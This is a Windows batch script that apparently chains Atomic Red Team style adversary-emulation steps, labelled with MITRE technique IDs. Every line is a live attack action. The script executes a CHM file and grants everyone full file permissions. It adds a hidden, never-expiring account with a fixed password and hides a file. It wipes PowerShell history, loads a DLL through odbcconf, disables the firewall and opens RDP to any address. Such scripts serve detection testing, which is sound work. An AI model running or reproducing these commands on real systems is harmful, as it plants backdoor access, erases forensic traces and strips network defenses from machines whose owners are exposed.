@echo Off
hh.exe 9e2e6f_T1218.001.chm
icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
cmd.exe /C NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never && REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0
attrib.exe +h %temp%\T1564.001.txt
powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear 
powershell.exe -ExecutionPolicy Bypass -C "Remove-Item (Get-PSReadlineOption).HistorySavePath"
odbcconf.exe /S /A {REGSVR "C:\Users\Public\sandcat.dll"}
NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never 
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
C:\Windows\system32\netsh.exe advfirewall firewall add rule "name=Open Port to Any" dir=in protocol=tcp localport=3389 action=allow profile=any